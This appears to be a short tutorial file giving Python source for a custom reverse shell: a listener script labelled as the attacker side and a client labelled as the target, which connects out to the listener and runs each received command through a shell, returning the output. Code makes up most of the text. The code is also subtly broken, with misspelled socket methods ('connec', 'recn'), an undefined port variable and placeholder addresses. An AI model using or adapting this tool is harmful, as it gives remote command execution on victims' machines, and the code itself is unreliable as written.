Goal:
====
1. Custom reverse shell using python

Replication Steps:
==================
Prerequisites:
    Install Python in both client and server
    Client and server able to communication using TCP/IP 

Run SERVER code first 
Note: Server IP and Listening port, use netstat command make sure server is running and listening 

Run Client code and you should see Shell# in server (in our case this is attacker) and you can run command 
in client (in our case target).

Server Script:
==============
E.g., 
SERVER_IP = "192.168.10.20"
SERVER_PORT=8080

====== SERVER =====
#!/usr/bin/env python3

import socket


def get_connection():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("SERVER NAME/IP", SERVER_PORT))
    s.listen(1)
    conn, addr = s.accept()
    print '[+] Connection established from: ', addr
    
    while 1:
        command = raw_input("Shell# ")
        
        if 'terminate' in command:
            conn.send('terminate')
            conn.close()
            break
        else:
            conn.send(command)
            print conn.recv(1024)
    

def main():
    get_connection()
    
if __name__=='__main__':
    main()
    
    
    
======= Client ======

import socket
import subprocess


def get_connection():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connec(('SERVER NAME/IP', SERVER_PORT))
    
    while 1:
        command = s.recn(1024)
        
        if 'terminate' in command:
            s.close()
            break
        else:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send( CMD.stdout.read() )
            s.send( CMD.stderr.read() )
            
def main():
        get_connection()
 

if __name__=='__main__':
    main()
    
 =====================   

        
        
            
            
